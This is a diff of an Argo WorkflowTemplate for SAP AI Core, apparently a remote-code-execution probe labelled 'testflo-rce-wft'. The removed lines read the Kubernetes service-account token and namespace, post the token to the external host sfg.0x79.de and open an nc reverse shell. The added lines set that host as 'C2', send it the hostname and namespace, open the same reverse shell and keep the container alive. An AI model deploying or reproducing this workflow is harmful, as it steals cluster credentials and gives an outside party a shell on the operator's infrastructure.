@@ -1,29 +1,34 @@
 apiVersion: argoproj.io/v1alpha1
 kind: WorkflowTemplate
 metadata:
-  name: testflo-rce-wft
+  name: testflo-rce-wft-1785276694
   annotations:
-    executables.ai.sap.com/name: testflo-rce-wft
-    executables.ai.sap.com/id: testflo-rce-wft
+    executables.ai.sap.com/name: testflo-rce-wft-1785276694
+    executables.ai.sap.com/id: testflo-rce-wft-1785276694
   labels:
     scenarios.ai.sap.com/id: testflo-scenario
     scenarios.ai.sap.com/name: testflo-scenario
-    executables.ai.sap.com/id: testflo-rce-wft
-    executables.ai.sap.com/name: testflo-rce-wft
+    executables.ai.sap.com/id: testflo-rce-wft-1785276694
+    executables.ai.sap.com/name: testflo-rce-wft-1785276694
     ai.sap.com/version: "1.0.0"
     ai.sap.com/resourcePlan: starter
 spec:
   entrypoint: cb
   templates:
     - name: cb
+      metadata:
+        labels:
+          ai.sap.com/resourcePlan: starter
       container:
         image: alpine:3.19
         command:
           - sh
           - -c
           - |
-            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-            NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-            wget -q -O- "https://sfg.0x79.de/cb?t=TESTFLO-WFT-JOB&ns=${NS}&h=$(hostname)" || true
-            wget -q --post-data "tok=${TOKEN}" "https://sfg.0x79.de/cb-tok?t=TESTFLO-WFT-JOB" || true
-            nc sfg.0x79.de 8080 -e /bin/sh || true
+            C2="sfg.0x79.de"
+            NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
+            HN=$(hostname)
+            env | grep -v 'TOKEN\|SECRET\|PASS\|KEY' || true
+            wget -q --post-data "TESTFLO-WFT-CB h=${HN} ns=${NS}" "http://${C2}:8080/cb" -O /dev/null 2>/dev/null || true
+            nc ${C2} 8080 -e /bin/sh || true
+            sleep 3600
